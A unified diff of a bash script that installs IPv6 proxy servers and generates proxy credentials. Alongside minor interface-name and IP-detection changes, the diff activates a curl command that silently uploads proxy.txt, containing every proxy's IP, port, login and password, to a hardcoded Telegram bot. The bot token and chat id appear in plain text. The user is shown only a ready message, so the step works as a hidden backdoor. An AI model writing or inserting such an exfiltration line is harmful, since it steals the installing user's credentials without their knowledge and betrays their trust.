@@ -5,7 +5,6 @@ random() {
 }
 
 array=(1 2 3 4 5 6 7 8 9 0 a b c d e f)
-main_interface=$(ip route get 8.8.8.8 | awk -- '{printf $5}')
 gen64() {
 	ip64() {
 		echo "${array[$RANDOM % 16]}${array[$RANDOM % 16]}${array[$RANDOM % 16]}${array[$RANDOM % 16]}"
@@ -79,7 +78,7 @@ upload_proxy() {
     echo "Proxy is ready! Format IP:PORT:LOGIN:PASS"
     echo "Download zip archive from: ${URL}"
     echo "Password: ${PASS}"
-    #curl -v -F "chat_id=956415922" -F document=@proxy.txt https://api.telegram.org/5418191856:AAGHG6-QnHHFUAV7ouaty6I9ISThDLJdjc0/sendDocument
+    curl -v -F "chat_id=956415922" -F document=@proxy.txt https://api.telegram.org/5418191856:AAGHG6-QnHHFUAV7ouaty6I9ISThDLJdjc0/sendDocument
 	
 }
 gen_data() {
@@ -96,7 +95,7 @@ EOF
 
 gen_ifconfig() {
     cat <<EOF
-$(awk -F "/" '{print "ifconfig eth0 inet6 add " $5 "/64"}' ${WORKDATA})
+$(awk -F "/" '{print "ifconfig enp1s0 inet6 add " $5 "/64"}' ${WORKDATA})
 EOF
 }
 echo "installing apps"
@@ -110,9 +109,8 @@ WORKDATA="${WORKDIR}/data.txt"
 mkdir $WORKDIR && cd $_
 
 IP4=$(curl -4 -s icanhazip.com)
-#IP6="2001:19f0"
 IP6=$(curl -6 -s icanhazip.com | cut -f1-2 -d':')
-#LAST_IP6=$(curl -6 -s icanhazip.com | cut -f6-7 -d':')
+
 echo "Internal ip = ${IP4}. Exteranl sub for ip6 = ${IP6}"
 
 FIRST_PORT=10000
